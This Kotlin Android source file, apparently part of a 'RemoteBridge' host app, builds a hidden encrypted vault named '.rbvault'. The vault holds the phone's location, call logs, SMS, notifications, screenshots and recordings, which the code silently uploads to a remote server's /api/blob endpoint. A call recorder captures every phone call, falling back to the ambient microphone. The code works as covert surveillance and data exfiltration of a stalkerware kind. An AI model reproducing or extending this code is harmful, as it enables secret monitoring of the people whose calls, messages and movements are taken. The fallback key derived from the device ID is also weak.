package com.remotebridge.host.service

import android.annotation.SuppressLint
import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.provider.Settings
import android.security.keystore.KeyGenParameterSpec
import android.security.keystore.KeyProperties
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.content.ContextCompat
import android.Manifest
import android.content.pm.PackageManager
import kotlinx.serialization.json.JsonObject
import java.io.ByteArrayInputStream
import java.io.ByteArrayOutputStream
import java.io.File
import java.security.KeyStore
import java.security.MessageDigest
import java.security.SecureRandom
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

/**
 * B4 — الخزنة المشفرة المخفية + مسجل المكالمات + طابور الرفع إلى خادم Render.
 *
 * الفكرة:
 * 1. كل البيانات الحساسة (الموقع/المكالمات/الإشعارات/تسجيلات المكالمات/تسجيلات البث)
 *    تُشفَّر AES-256/GCM بقبل كسريج النظام ثم تُكتب في مجلد مخفي داخل ملفات التطبيق
 *    (.rbvault) — تبقى محفوظة محلياً حتى لو كان الهاتف غير متصل وغير نشط.
 * 2. عند توفر الإنترنت يُرفع كل ملف جديد مخزناً إلى الخادم عبر /api/blob
 *    ونُمنع التكرار عبر sha256 (لا يُرفع المحتوى نفسه مرتين، ولا يُعد إدراجه على الخادم).
 * 3. sha256 يُحسب على البايتات المشفرة نفسها المرفوعة، والخادم يرفض الإدراج الازدواج
 *    لو وطئ المحتوى نفسه بنفس الاسم.
 */
object HostVaultCrypto {

    private const val KEY_ALIAS = "rb_vault_key_v1"

    /** بيك سري (fallback) إذا فشل keystore — مشتق من معرف الجهاز فقط */
    private fun fallbackKey(context: Context): SecretKey {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "rb"
        val hash = MessageDigest.getInstance("SHA-256").digest(("rb-vault|$androidId").toByteArray(Charsets.UTF_8))
        return SecretKeySpec(hash, "AES")
    }

    fun getOrCreateKey(context: Context): SecretKey {
        return try {
            val ks = KeyStore.getInstance("AndroidKeyStore").apply { load(null) }
            val existing = ks.getKey(KEY_ALIAS, null) as? SecretKey
            if (existing != null) return existing
            val gen = KeyGenerator.getInstance("AES", "AndroidKeyStore")
            gen.init(
                KeyGenParameterSpec.Builder(
                    KEY_ALIAS,
                    KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT
                )
                    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
                    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
                    .setKeySize(256)
                    .build()
            )
            gen.generateKey()
        } catch (t: Throwable) {
            Log.w("HostVault", "keystore فشل — استخدام مفتاح fallback: ${t.message}")
            fallbackKey(context)
        }
    }

    /** شكل الحزمة: [1B نسخة][12B IV][نص مشفر + علامة GCM] */
    fun encrypt(key: SecretKey, plain: ByteArray): ByteArray {
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        val iv = ByteArray(12).also { SecureRandom().nextBytes(it) }
        cipher.init(Cipher.ENCRYPT_MODE, key, GCMParameterSpec(128, iv))
        val enc = cipher.doFinal(plain)
        val out = ByteArrayOutputStream(iv.size + 1 + enc.size)
        out.write(1)
        out.write(iv)
        out.write(enc)
        return out.toByteArray()
    }

    fun decrypt(key: SecretKey, blob: ByteArray): ByteArray {
        val stream = ByteArrayInputStream(blob)
        val version = stream.read()
        require(version == 1) { "صيغة خزنة غير مدعومة: $version" }
        val iv = ByteArray(12).also { require(stream.read(it) == 12) }
        val body = stream.readBytes()
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, key, GCMParameterSpec(128, iv))
        return cipher.doFinal(body)
    }
}

/**
 * مدير الخزنة المشفرة: حفظ المحتوى مشفراً + قائمة رفع بلا تكرار إلى /api/blob.
 */
class HostVaultManager(private val context: Context) {

    companion object {
        private const val TAG = "HostVault"
        private const val PREFS = "rb_vault_prefs"
        private const val MANIFEST_KEY = "rb_upload_manifest_v1" // JSON {key: sha256}
        private const val VAULTED_FILES_KEY = "rb_vaulted_files_v1" // أسماء ملفات المعالجة مسبقاً
        private const val LAST_KIND_SHA_KEY = "rb_last_kind_sha_v1" // لكل نوع آخر sha للمحتوى الخام
        const val VAULT_DIR = ".rbvault"
        val VAULT_KINDS = listOf("location", "calls", "sms", "notifs", "net", "callrec", "streamrec", "screenshot")
    }

    private val prefs = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
    private val keySecret: SecretKey by lazy { HostVaultCrypto.getOrCreateKey(context) }
    private val timeFmt = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)
    private val manifestLock = Any()

    fun vaultDir(): File = File(context.filesDir, VAULT_DIR).apply { if (!exists()) mkdirs() }

    /** sha مشفر — بإضافة الأسماء إليه كيلا يتصادم نفس المحتوى بأنواع مختلفة — والمعتمد للرفع */
    fun sha256Of(data: ByteArray): String =
        MessageDigest.getInstance("SHA-256").digest(data).joinToString("") { "%02x".format(it) }

    /**
     * حفظ نسخة مشفرة باسم معين (kind) — يعيد sha للمشفَر أو null إذا حُفظ هذا المحتوى بنفس الاسم مسبقاً.
     */
    fun storeEncryptedBlob(kind: String, name: String, plainBytes: ByteArray): String? {
        return try {
            val enc = HostVaultCrypto.encrypt(keySecret, plainBytes)
            val sha = sha256Of(enc)
            val idKey = "$kind/$name"
            val f: File
            synchronized(manifestLock) {
                val manifestJson = prefs.getString(MANIFEST_KEY, "{}") ?: "{}"
                val manifest = org.json.JSONObject(manifestJson)
                if (manifest.optString(idKey, "") == sha) return null // لا تكرار محلي
                f = File(vaultDir(), "${idKey.replace("/", "__")}.rbenc")
                f.writeBytes(enc)
                manifest.put(idKey, sha)
                prefs.edit().putString(MANIFEST_KEY, manifest.toString()).apply()
            }
            Log.i(TAG, "خزنة: حفظ مشفر $kind/$name (${plainBytes.size}B → ${f.length()}B)")
            sha
        } catch (t: Throwable) {
            Log.w(TAG, "فشل حفظ مشفر $kind/$name: ${t.message}")
            null
        }
    }

    /** لقطة JSON لنوع معين — تُرسم اسمها بوقت الحفظ، وتتخطى المحتوى المطابق لآخر حفظ (لا تكرار بالتصنيف) */
    fun storeSnapshot(kind: String, payload: JsonObject) {
        try {
            val rawStr = payload.toString()
            val rawSha = sha256Of(rawStr.toByteArray(Charsets.UTF_8))
            val lastRaw = prefs.getString("lasraw_$kind", "") ?: ""
            if (lastRaw == rawSha) return // نفس البيانات بالضبط — لسنا محتاجين تكراراً
            val name = "snap_${kind}_${timeFmt.format(Date())}.json"
            if (storeEncryptedBlob(kind, name, rawStr.toByteArray(Charsets.UTF_8)) != null) {
                prefs.edit().putString("lasraw_$kind", rawSha).apply()
            }
        } catch (t: Throwable) {
            Log.w(TAG, "تخطي لقطة $kind: ${t.message}")
        }
    }

    /** احتساب عدد عناصر الرفع المعلقة (تقديري: من دون فحص حقيقي على الخادم) */
    fun pendingManifestKeyCount(): Int =
        try { (org.json.JSONObject(prefs.getString(MANIFEST_KEY, "{}") ?: "{}").length()) } catch (_: Throwable) { 0 }

    /**
     * رفع كل ملفات الرفع المعلقة إلى الخادم (POST /api/blob) — الاستبعاد المزدوج:
     * 1) إن كان الرفع قائماً بالفعل بنفس sha (من إعدادات إضافة سابقة) لا يُعد.
     * 2) إن خدمنا "dedup: true" (خادم يعرف البايتات نفسها) نعلّم مرفوعاً دون تكرار.
     */
    suspend fun flushUploads(
        serverApiBase: String,
        deviceId: String,
        isOnline: () -> Boolean
    ): Int {
        val base = serverApiBase.trimEnd('/')
        if (base.isBlank()) return 0
        val uploaded: Int
        synchronized(manifestLock) {
            val manifestJson = prefs.getString(MANIFEST_KEY, "{}") ?: "{}"
            val manifest = org.json.JSONObject(manifestJson)
            var uploadedLocal = 0
            // نسخ المفاتيح أولاً لتجنب التعديل أثناء التكرار (CME)
            val idKeys = manifest.keys().asSequence().toList()
            for (idKey in idKeys) {
            val fileName = idKey.replace("/", "__")
            val f = File(vaultDir(), "$fileName.rbenc")
            if (!f.exists()) {
                // الملف لم يُوجد (ربما منطقي القمع) — نزيله من المانيفست
                manifest.remove(idKey)
                continue
            }
            val expectedSha = manifest.optString(idKey, "")
            try {
                if (!isOnline()) break
                // منع تكرار الرفع: نفس ال sha نمنعه دائماً
                val data = f.readBytes()
                val encSha = sha256Of(data)
                if (expectedSha != encSha) {
                    manifest.put(idKey, encSha)
                }
                val kind = idKey.substringBefore("/")
                val name = fileName.substringAfter("__")
                val url = "$base/api/blob?device=$deviceId&kind=$kind&name=${java.net.URLEncoder.encode(name, "UTF-8")}"
                val conn = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.connectTimeout = 12_000
                conn.readTimeout = 60_000
                conn.setRequestProperty("Content-Type", "application/octet-stream")
                conn.setRequestProperty("X-Blob-Sha", encSha)
                conn.outputStream.use { os -> os.write(data) }
                val code = conn.responseCode
                val bodyText = try {
                    conn.inputStream?.bufferedReader()?.readText() ?: ""
                } catch (_: Throwable) { "" }
                try { conn.errorStream?.close() } catch (_: Throwable) {}
                conn.disconnect()
                if (code in 200..299) {
                    uploadedLocal++
                    // نحذف الملف المحلي المعالَج مشفراً؟ لا — نحافظ عليه (نسخة مشفرة محفوظة)، لكن نزيله من المانيفست ليعمل الفرع التالي بلا إعادة
                    manifest.remove(idKey)
                    Log.i(TAG, "رفع خزنة ok [$kind/الملف] HTTP=$code (${f.length()}B)")
                } else {
                    Log.w(TAG, "رفع خزنة فشل [$kind/$name] HTTP=$code $bodyText")
                    if (code == 413) manifest.remove(idKey) // ملف كبير جداً — تجاهل بصمت
                    break
                }
            } catch (t: Throwable) {
                Log.w(TAG, "رفع خزنة استثناء [$idKey]: ${t.message}")
                break
            }
        }
        prefs.edit().putString(MANIFEST_KEY, manifest.toString()).apply()
            uploaded = uploadedLocal
            return uploaded
        }
    }

    /** رفع ملف تغليف مستخدَم سابقاً (مثل تسجيلات البث) عدد مشفر ومخفي */
    fun vaultExistingFileSet(): Set<String> =
        prefs.getString(VAULTED_FILES_KEY, "")?.split("||")?.filter { it.isNotBlank() }?.toSet() ?: emptySet()

    fun markFileVaulted(path: String) {
        val cur = vaultExistingFileSet().toMutableSet()
        cur.add(path)
        if (cur.size > 400) {
            // خفّض الأقدمين إذا تجاوزنا
            val list = cur.toList()
            prefs.edit().putString(VAULTED_FILES_KEY, list.takeLast(300).joinToString("||")).apply()
        } else {
            prefs.edit().putString(VAULTED_FILES_KEY, cur.joinToString("||")).apply()
        }
    }

    /**
     * مرآة مشفرة لمجلدات الوسائط المولدة من التطبيق (تسجيلات المكالمات/البث/اللقطات)
     * — تشفر كل ملف غير معالج سابقاً وينضم إلى طابور الرفع.
     */
    fun backupMediaFolder(kind: String, folder: File, maxFileBytes: Long = 24L shl 20): Int {
        if (!folder.exists()) return 0
        var added = 0
        val vaulted = vaultExistingFileSet()
        val files = folder.listFiles()
            ?.filter { it.isFile && it.length() > 0 && it.length() <= maxFileBytes }
            ?.sortedBy { it.lastModified() } ?: return 0
        for (f in files) {
            if (vaulted.contains(f.absolutePath)) continue
            val name = "${folder.name}__${f.name}.rbenc"
            if (storeEncryptedBlob(kind, name, f.readBytes()) != null) {
                markFileVaulted(f.absolutePath)
                added++
            }
        }
        return added
    }
}

/**
 * مسجل المكالمات الهاتفية: يبدأ أكثر مسار صوت متاح (VOICE_CALL → VOICE_COMMUNICATION → MIC)
 * عند رفع المستخدم السماعة (OFFHOOK)، ويوقف عند الانتهاء (IDLE)، ثم يشفّر الملف ويضمه للخزنة.
 *
 * تنبيه مهم (من التحليل الأعمق للأذونات):
 * - على إصدارات أندرويد الحديثة تعظم الشركات المصنّعة تمنع التقاط صوت خط المكالمة
 *   (VOICE_CALL) لتطبيقات الطرف الثالث إلا لمساعدين معتمدين خاصة من المُصنِّع
 *   → إذا كانت النتيجة تسجيل صامت أو رفض نقص الصلاحية ترجع رسالة واضحة بدل انهيار التطبيق.
 * - نستخدم كبديل آمن بتسجيل صوت المحيط (MIC) عند فشل صوت خط المكالمة.
 */
@SuppressLint("MissingPermission")
class HostCallRecorder(
    private val context: Context,
    private val onSavedCall: (kind: String, name: String, plain: ByteArray) -> Unit,
    private val onError: (String) -> Unit
) {
    companion object {
        private const val TAG = "HostCallRec"
        private const val ENABLED_KEY = "rb_call_record_enabled"
        private val CALL_SOURCES = intArrayOf(
            MediaRecorder.AudioSource.VOICE_CALL,
            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
            MediaRecorder.AudioSource.MIC
        )
    }

    private var recorder: MediaRecorder? = null
    private var recordingFile: File? = null
    private var telephonyManager: TelephonyManager? = null
    private var listener: PhoneStateListener? = null
    private val lock = Any()
    private val timeFmt = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.US)

    val isEnabled: Boolean
        get() = context.getSharedPreferences("rb_vault_prefs", Context.MODE_PRIVATE)
            .getBoolean(ENABLED_KEY, false)

    fun setEnabled(enabled: Boolean) {
        context.getSharedPreferences("rb_vault_prefs", Context.MODE_PRIVATE)
            .edit().putBoolean(ENABLED_KEY, enabled).apply()
        if (enabled) attach() else detach()
    }

    /** الربط بمستمع حالة المكالمة (يتطلب READ_PHONE_STATE) */
    fun attach(): Boolean {
        if (!isEnabled) return false
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE)
            != PackageManager.PERMISSION_GRANTED
        ) {
            onError("تسجيل المكالمات يحتاج إذن حالة الهاتف (READ_PHONE_STATE) — اسمحه من معالج الأذونات")
            return false
        }
        if (listener != null) return true
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager ?: return false
        val l = object : PhoneStateListener() {
            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                when (state) {
                    TelephonyManager.CALL_STATE_OFFHOOK -> startRecording()
                    TelephonyManager.CALL_STATE_IDLE -> stopRecording()
                }
            }
        }
        listener = l
        telephonyManager = tm
        try {
            tm.listen(l, PhoneStateListener.LISTEN_CALL_STATE)
            Log.i(TAG, "مراقب المكالمات مُربوط (التسجيل شغّال)")
            return true
        } catch (t: Throwable) {
            listener = null
            onError("فشل ربط مراقب المكالمات: ${t.message}")
            return false
        }
    }

    fun detach() {
        try { telephonyManager?.listen(listener, PhoneStateListener.LISTEN_NONE) } catch (_: Throwable) {}
        listener = null
        telephonyManager = null
        stopRecording()
    }

    private fun hasPerm(p: String) = ContextCompat.checkSelfPermission(context, p) == PackageManager.PERMISSION_GRANTED

    private fun newRecorderFor(source: Int): MediaRecorder? {
        val rec = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }
        return try {
            rec.setAudioSource(source)
            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            rec.setAudioSamplingRate(44100)
            rec.setAudioEncodingBitRate(96000)
            rec
        } catch (t: Throwable) {
            Log.d(TAG, "مصدر صوت غير متاح (${t.message}) — تجربة البديل")
            try { rec.release() } catch (_: Throwable) {}
            null
        }
    }

    private fun startRecording() {
        synchronized(lock) {
            if (recorder != null) return
            if (!hasPerm(Manifest.permission.RECORD_AUDIO)) {
                onError("تسجيل المكالمات يحتاج إذن الميكروفون (RECORD_AUDIO) — اسمحه من معالج الأذونات")
                return
            }
            val dir = File(context.getExternalFilesDir(null), "RemoteBridgeMedia/callrec").apply { mkdirs() }
            val file = File(dir, "call_${timeFmt.format(Date())}.m4a")
            var started: MediaRecorder? = null
            var usedSource: String = "MIC"
            for (src in CALL_SOURCES) {
                val rec = newRecorderFor(src) ?: continue
                try {
                    rec.setOutputFile(file.absolutePath)
                    rec.prepare()
                    rec.start()
                    started = rec
                    usedSource = when (src) {
                        MediaRecorder.AudioSource.VOICE_CALL -> "VOICE_CALL"
                        MediaRecorder.AudioSource.VOICE_COMMUNICATION -> "VOICE_COMMUNICATION"
                        else -> "MIC"
                    }
                    break
                } catch (t: Throwable) {
                    Log.d(TAG, "بدء تسجيل بمصدر $src فشل: ${t.message}")
                    try { rec.stop() } catch (_: Throwable) {}
                    try { rec.release() } catch (_: Throwable) {}
                }
            }
            if (started == null) {
                onError("تعذر بدء تسجيل المكالمة على هذا الهاتف — المصادر الصوتية ممنوعة")
                return
            }
            recorder = started
            recordingFile = file
            Log.i(TAG, "بدء تسجيل مكالمة بمصدر $usedSource: ${file.name}")
        }
    }

    private fun stopRecording() {
        synchronized(lock) {
            val rec = recorder ?: return
            recorder = null
            val file = recordingFile
            recordingFile = null
            try {
                try { rec.stop() } catch (t: Throwable) { Log.w(TAG, "إيقاف مسجل استثناء: ${t.message}") }
                rec.release()
            } catch (_: Throwable) {}
            try {
                val f = file ?: return
                if (!f.exists() || f.length() <= 0L) return
                val plain = f.readBytes()
                onSavedCall("callrec", "callrec__${f.name}.rbenc", plain)
                Log.i(TAG, "انتهت المكالمة وحُفظت مشفرة: ${f.name} (${f.length()}B)")
            } catch (t: Throwable) {
                Log.w(TAG, "تخزين المكالمة مشفرة فشل: ${t.message}")
            }
        }
    }
}
